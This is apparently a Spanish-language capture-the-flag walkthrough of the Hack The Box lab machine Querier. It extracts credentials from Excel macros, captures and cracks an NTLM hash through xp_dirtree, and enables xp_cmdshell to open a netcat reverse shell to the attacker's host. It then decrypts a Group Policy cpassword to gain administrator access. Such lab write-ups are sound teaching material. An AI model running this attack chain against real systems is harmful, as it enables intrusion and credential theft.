10.10.10.125 - Querier

![Querier](https://user-images.githubusercontent.com/96772264/202670219-d31b9300-527b-4c64-969f-b9527550057e.png)

----------------------
# Part 1: Enmeración
 
Puertos abiertos 135(rpc),139,445(smb),1433,5985. Nmap nos dice que:  
- 1433 -> puerto Microsoft SQL . Nombre del sistema QUERIER, Dominio HTB.LOCAL  
- Rpc sin credenciales ```rpcclient -U "" 10.10.10.125 -N``` -> Acceso denegado  

Como está el smb abierto miraremos si podemos acceder a algún archivo.
```console
└─$ smbmap -H 10.10.10.125 -u "test"
	Reports                        READ ONLY
└─$ smbclient "//10.10.10.125/Reports" -N
smb: \> dir
Currency Volume Report.xlsm         A    12229  Sun Jan 27 23:21:34 2019
smb: \> get "Currency Volume Report.xlsm"
```

------------------------------
# Part 2: Extrayendo creds de las macros

Un archivo xlsm es un archivo de hojas de texto (el excel de toda la vida), que e abre con libreoffice. Abrimos la hoja de calculo pero aparte de ques está vacía 
dice que tiene macros (código)

![querier1](https://user-images.githubusercontent.com/96772264/202670532-f9871866-0f10-453e-9ecd-dfde1143e3a1.PNG)

Las macros se leen con una herramienta llamada olevba:  ```sudo -H pip install -U oletools[full]```
```console
└─$ olevba "Currency Volume Report.xlsm"
Private Sub Connect()
Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset
Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;
Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10; conn.Open

If conn.State = adStateOpen Then
  MsgBox "connection successful" 
  Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close
End If
```
------------------------------
# Part 3: mssql 

Según esto se está conectando a una base de datos sql ("volume") con las creds *"reporting:PcwTWTHRwryjc$c6"* para meter esos datos en la hoja de calculo.
Como son creds de una base de datos, podemos usarlas nosotros tambien ya que tenemos un puerto que usa windowssql:
```console
└─$ /usr/bin/impacket-mssqlclient reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth
SQL> sp_configure "show advanced options", 1

# No, tenemos permiso así que no hay comandos, pero a lo mejor podemos capturar un hash
SQL> xp_dirtree "\\10.10.14.12\carpeta"
└─$ /usr/bin/impacket-smbserver carpeta $(pwd) -smb2support
[*] User QUERIER\mssql-svc authenticated successfully
[*] mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:b5d17ef4aa88056ad273977e56a155fc:010100000000000080407d3ce8f9d8016f28bccc5409518100000000010010006f006100710055006900550049004900030010006f0061007100550069005500490049000200100058005a005000540078005500610057000400100058005a005000540078005500610057000700080080407d3ce8f9d801060004000200000008003000300000000000000000000000003000009b175c468e21ef38d90e68aba21eadedb3bfaec84eab5a5cf439e8d79e35d69e0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003200000000000000000000000000
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
corporate568     (mssql-svc)

└─$ /usr/bin/impacket-mssqlclient mssql-svc:'corporate568'@10.10.10.125 -windows-auth
SQL> sp_configure "show advanced options", 1; reconfigure
SQL> sp_configure "xp_cmdshell",1; reconfigure
SQL> xp_cmdshell "whoami"
querier\mssql-svc
```
Como ya tengo ejecución remota de comandos, lo más comodo es traerse un binario nc.exe a donde se está ofreciendo la carpeta por smb para subirlo/ejecutarlo en la 
máquina víctima. 

------------------------------
# Part 4: Dentro del sistema, escalando privilegios

```console
SQL> xp_cmdshell \\10.10.14.12\carpeta\nc.exe -e cmd.exe 10.10.14.12 443
└─$ rlwrap nc -lnvp 443
C:\Windows\system32>
C:\Users\mssql-svc\Desktop> copy \\10.10.14.12\carpeta\enumeracion_windows.bat
```
El script nos encontró una ruta groups.xml:  
> *C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml*.   
Ahí había una clave cpassword que se rompe con ggp-decrypt:  
```console
└─$ gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ
MyUnclesAreMarioAndLuigi!!1!

└─$ impacket-wmiexec 'administrator:MyUnclesAreMarioAndLuigi!!1!@10.10.10.125'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
C:\>whoami
querier\administrator
```
